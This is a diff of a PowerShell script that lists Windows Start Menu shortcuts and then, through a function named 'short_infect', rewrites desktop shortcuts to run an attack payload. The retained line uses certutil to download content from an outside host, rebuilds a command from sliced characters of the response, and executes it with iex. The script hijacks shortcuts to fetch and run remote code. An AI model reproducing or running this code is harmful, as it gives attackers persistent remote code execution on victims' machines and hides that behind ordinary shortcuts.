@@ -11,9 +11,9 @@ ForEach($ShortCut in $StartMenu)
     Write-Host "Icon:>"$lnk.IconLocation;
     Write-Host "Demmarrage location:>"$lnk.WorkingDirectory;
     $test_lenght=$lnk.TargetPath.Length + $lnk.Arguments.Length;
-    if ($test_lenght -gt 68)
+    if ($test_lenght -gt 71)
     {
-        $test_lenght+= 191;
+        $test_lenght+= 188;
         write-host "TROP LONG: "$test_lenght "(259 requis)";
     }
     elseif ($lnk.TargetPath -eq "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"){
@@ -45,5 +45,4 @@ ForEach($ShortCut in $StartMenu)
 }
 $desktop_path= $env:USERPROFILE;
 $desktop_path+= "\Desktop";
-short_infect -PathShortcut $desktop_path '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c';
-short_infect -PathShortcut "C:\Users\Public\Desktop" '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c';-ErrorAction SilentlyContinue 
+short_infect -PathShortcut $desktop_path '$t=certutil -urlcache -f http://r3dc.github.io;$c='''';For($i=3;$i -lt $t.Count-1;$i++){$c += -join $t[$i][61..76]};iex $c';-ErrorAction SilentlyContinue 
